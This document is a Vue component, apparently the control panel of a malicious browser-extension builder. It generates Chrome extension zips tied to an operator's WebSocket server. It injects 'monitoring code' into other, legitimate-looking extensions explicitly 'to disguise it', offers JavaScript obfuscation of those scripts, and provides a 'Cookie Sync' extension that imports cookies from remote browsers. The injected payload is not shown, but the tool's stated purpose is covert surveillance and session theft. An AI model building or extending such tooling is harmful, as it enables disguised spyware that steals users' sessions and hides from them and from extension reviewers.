<script setup lang="ts">
import { computed, onMounted, ref } from 'vue'
import { api } from '@/api/client'
import Btn from '@/components/ui/Btn.vue'
import Field from '@/components/ui/Field.vue'

interface EmbedTarget {
  id: string
  name: string
}

interface ValidateResult {
  valid: boolean
  name?: string
  version?: string
  service_worker?: string
  sw_type?: string
  permissions?: string[]
  error?: string
}

const wsUrl = ref('')
const embed = ref('none')
const obfuscate = ref(false)
const targets = ref<EmbedTarget[]>([])
const loading = ref(false)

const uploadFile = ref<File | null>(null)
const uploadFileName = ref('')
const uploadValidation = ref<ValidateResult | null>(null)
const uploading = ref(false)
const injecting = ref(false)
const saving = ref(false)
const saveId = ref('')
const uploadMsg = ref<{ type: 'ok' | 'err'; text: string } | null>(null)

const fileInputRef = ref<HTMLInputElement | null>(null)

const defaultWsUrl = computed(() => {
  const host = window.location.hostname
  return `wss://${host}:4343`
})

onMounted(async () => {
  wsUrl.value = defaultWsUrl.value
  await refreshTargets()
})

async function refreshTargets() {
  try {
    const res = await api.get<EmbedTarget[]>('/api/v1/extension/targets')
    targets.value = res
  } catch {
    targets.value = []
  }
}

function download(): void {
  loading.value = true
  const params = new URLSearchParams()
  params.set('ws_url', wsUrl.value || defaultWsUrl.value)
  if (embed.value && embed.value !== 'none') {
    params.set('embed', embed.value)
  }
  if (obfuscate.value) {
    params.set('obfuscate', '1')
  }
  const url = `/api/v1/extension/download?${params.toString()}`
  const a = document.createElement('a')
  a.href = url
  a.download = ''
  document.body.appendChild(a)
  a.click()
  a.remove()
  setTimeout(() => { loading.value = false }, 1500)
}

function downloadCookieSync(): void {
  const params = new URLSearchParams()
  params.set('ws_url', wsUrl.value || defaultWsUrl.value)
  params.set('embed', 'cookie-sync')
  if (obfuscate.value) {
    params.set('obfuscate', '1')
  }
  const url = `/api/v1/extension/download?${params.toString()}`
  const a = document.createElement('a')
  a.href = url
  a.download = ''
  document.body.appendChild(a)
  a.click()
  a.remove()
}

function triggerFileInput(): void {
  fileInputRef.value?.click()
}

function onFileSelect(e: Event): void {
  const input = e.target as HTMLInputElement
  if (input.files?.length) {
    uploadFile.value = input.files[0]
    uploadFileName.value = input.files[0].name
    uploadValidation.value = null
    uploadMsg.value = null
    saveId.value = input.files[0].name.replace(/\.zip$/i, '').replace(/[^a-zA-Z0-9_-]/g, '-')
  }
}

async function validateUpload(): Promise<void> {
  if (!uploadFile.value) return
  uploading.value = true
  uploadMsg.value = null
  try {
    const fd = new FormData()
    fd.append('extension', uploadFile.value)
    const res = await fetch('/api/v1/extension/upload-validate', {
      method: 'POST',
      credentials: 'same-origin',
      body: fd,
    })
    const json = await res.json()
    if (json.success) {
      uploadValidation.value = json.result as ValidateResult
    } else {
      uploadMsg.value = { type: 'err', text: json.error || 'Validation failed' }
    }
  } catch (e) {
    uploadMsg.value = { type: 'err', text: e instanceof Error ? e.message : 'Network error' }
  } finally {
    uploading.value = false
  }
}

async function testInject(): Promise<void> {
  if (!uploadFile.value) return
  injecting.value = true
  uploadMsg.value = null
  try {
    const fd = new FormData()
    fd.append('extension', uploadFile.value)
    fd.append('ws_url', wsUrl.value || defaultWsUrl.value)
    if (obfuscate.value) fd.append('obfuscate', '1')
    const res = await fetch('/api/v1/extension/upload-test', {
      method: 'POST',
      credentials: 'same-origin',
      body: fd,
    })
    if (!res.ok) {
      const json = await res.json()
      uploadMsg.value = { type: 'err', text: json.error || `HTTP ${res.status}` }
      return
    }
    const blob = await res.blob()
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    const cd = res.headers.get('content-disposition') || ''
    const match = cd.match(/filename="(.+?)"/)
    a.download = match?.[1] || 'injected-extension.zip'
    document.body.appendChild(a)
    a.click()
    a.remove()
    URL.revokeObjectURL(url)
    uploadMsg.value = { type: 'ok', text: 'Injection successful — downloading merged zip' }
  } catch (e) {
    uploadMsg.value = { type: 'err', text: e instanceof Error ? e.message : 'Injection failed' }
  } finally {
    injecting.value = false
  }
}

async function saveAsTarget(): Promise<void> {
  if (!uploadFile.value || !saveId.value) return
  saving.value = true
  uploadMsg.value = null
  try {
    const fd = new FormData()
    fd.append('extension', uploadFile.value)
    fd.append('id', saveId.value)
    const res = await fetch('/api/v1/extension/save-target', {
      method: 'POST',
      credentials: 'same-origin',
      body: fd,
    })
    const json = await res.json()
    if (json.success) {
      uploadMsg.value = { type: 'ok', text: `Saved as embed target "${json.result.name || saveId.value}"` }
      await refreshTargets()
    } else {
      uploadMsg.value = { type: 'err', text: json.error || 'Save failed' }
    }
  } catch (e) {
    uploadMsg.value = { type: 'err', text: e instanceof Error ? e.message : 'Save failed' }
  } finally {
    saving.value = false
  }
}

async function deleteTarget(id: string): Promise<void> {
  try {
    await api.post('/api/v1/extension/delete-target', { id })
    await refreshTargets()
    if (embed.value === id) embed.value = 'none'
  } catch { /* ignore */ }
}
</script>

<template>
  <section class="surface p-5 space-y-4">
    <div>
      <h2 class="text-[13px] font-semibold">Extension package</h2>
      <p class="text-[12px] text-fg-muted mt-0.5">
        Download a configured Chrome extension zip with your server address baked in.
      </p>
    </div>

    <Field
      v-model="wsUrl"
      label="WebSocket server URL"
      :placeholder="defaultWsUrl"
      hint="The WS endpoint the extension connects to."
    />

    <label class="block">
      <span class="block text-[11px] uppercase tracking-wider text-fg-muted mb-1.5">
        Embed into
      </span>
      <select
        v-model="embed"
        class="w-full h-9 text-[13px] px-3 bg-bg-base border border-border-subtle text-fg-base rounded-md focus:outline-none focus:border-accent focus:ring-1 focus:ring-accent/40 transition-colors"
      >
        <option value="none">None (standalone extension)</option>
        <option
          v-for="t in targets"
          :key="t.id"
          :value="t.id"
        >
          {{ t.name }}
        </option>
      </select>
      <p class="text-fg-faint text-[11px] mt-1">
        Inject monitoring code into another extension to disguise it.
      </p>
    </label>

    <!-- Obfuscation toggle -->
    <label class="flex items-center gap-2.5 cursor-pointer select-none">
      <input
        v-model="obfuscate"
        type="checkbox"
        class="w-4 h-4 rounded border border-border-subtle bg-bg-base text-accent focus:ring-accent/40 focus:ring-1 cursor-pointer"
      >
      <div>
        <span class="text-[13px] text-fg-base">Obfuscate JavaScript</span>
        <p class="text-[11px] text-fg-faint">
          Apply string encoding, dead code injection, and IIFE wrapping to monitoring scripts.
        </p>
      </div>
    </label>

    <!-- Embed targets management -->
    <div v-if="targets.length > 0" class="space-y-1">
      <span class="text-[11px] uppercase tracking-wider text-fg-muted">
        Available targets ({{ targets.length }})
      </span>
      <div class="grid grid-cols-2 gap-1.5">
        <div
          v-for="t in targets"
          :key="t.id"
          class="flex items-center justify-between px-2 py-1.5 bg-bg-base/50 border border-border-subtle rounded text-[11px]"
        >
          <span class="truncate mr-1" :title="t.name">{{ t.name }}</span>
          <button
            class="text-fg-faint hover:text-danger flex-shrink-0"
            title="Remove target"
            @click="deleteTarget(t.id)"
          >
            &times;
          </button>
        </div>
      </div>
    </div>

    <Btn variant="primary" :loading="loading" @click="download">
      Download extension .zip
    </Btn>
  </section>

  <!-- Cookie Sync Extension download -->
  <section class="surface p-5 space-y-3">
    <div>
      <h2 class="text-[13px] font-semibold">Cookie Sync extension</h2>
      <p class="text-[12px] text-fg-muted mt-0.5">
        Client-side extension for syncing cookies, managing proxy connections, and importing cookies from remote browsers.
      </p>
    </div>
    <Btn variant="subtle" @click="downloadCookieSync">
      Download Cookie Sync .zip
    </Btn>
  </section>

  <!-- Upload & Test Inject section -->
  <section class="surface p-5 space-y-4">
    <div>
      <h2 class="text-[13px] font-semibold">Upload &amp; Test Inject</h2>
      <p class="text-[12px] text-fg-muted mt-0.5">
        Upload any MV3 Chrome extension zip to test monitoring code injection.
      </p>
    </div>

    <div>
      <span class="block text-[11px] uppercase tracking-wider text-fg-muted mb-1.5">
        Extension zip file
      </span>
      <div class="flex items-center gap-3">
        <input
          ref="fileInputRef"
          type="file"
          accept=".zip"
          class="hidden"
          @change="onFileSelect"
        >
        <Btn variant="subtle" @click="triggerFileInput">
          Choose file
        </Btn>
        <span class="text-[12px] text-fg-muted truncate">
          {{ uploadFileName || 'No file selected' }}
        </span>
      </div>
    </div>

    <div v-if="uploadFile" class="space-y-3">
      <!-- Validate button -->
      <Btn variant="subtle" :loading="uploading" @click="validateUpload">
        Validate extension
      </Btn>

      <!-- Validation result -->
      <div v-if="uploadValidation" class="p-3 rounded-md text-[12px] border" :class="uploadValidation.valid ? 'bg-success/10 border-success/30' : 'bg-danger/10 border-danger/30'">
        <div v-if="uploadValidation.valid">
          <p class="font-semibold text-success">Compatible with injection</p>
          <div class="mt-1.5 space-y-0.5 text-fg-muted">
            <p><span class="text-fg-base">Name:</span> {{ uploadValidation.name }}</p>
            <p><span class="text-fg-base">Version:</span> {{ uploadValidation.version }}</p>
            <p><span class="text-fg-base">SW:</span> {{ uploadValidation.service_worker }} ({{ uploadValidation.sw_type || 'classic' }})</p>
            <p v-if="uploadValidation.permissions"><span class="text-fg-base">Permissions:</span> {{ (uploadValidation.permissions || []).join(', ') }}</p>
          </div>
        </div>
        <div v-else>
          <p class="font-semibold text-danger">Not compatible</p>
          <p class="text-fg-muted mt-0.5">{{ uploadValidation.error }}</p>
        </div>
      </div>

      <!-- Action buttons -->
      <div class="flex gap-2">
        <Btn
          variant="primary"
          :loading="injecting"
          :disabled="!!(uploadValidation && !uploadValidation.valid)"
          class="flex-1"
          @click="testInject"
        >
          Test inject &amp; download
        </Btn>
      </div>

      <!-- Save as target -->
      <div class="flex gap-2 items-end">
        <div class="flex-1">
          <Field
            v-model="saveId"
            label="Save as embed target"
            placeholder="target-id"
            hint="ID used in the embed dropdown."
          />
        </div>
        <Btn variant="subtle" :loading="saving" class="mb-[22px]" @click="saveAsTarget">
          Save
        </Btn>
      </div>

      <!-- Messages -->
      <p v-if="uploadMsg" class="text-[12px]" :class="uploadMsg.type === 'ok' ? 'text-success' : 'text-danger'">
        {{ uploadMsg.text }}
      </p>
    </div>
  </section>
</template>
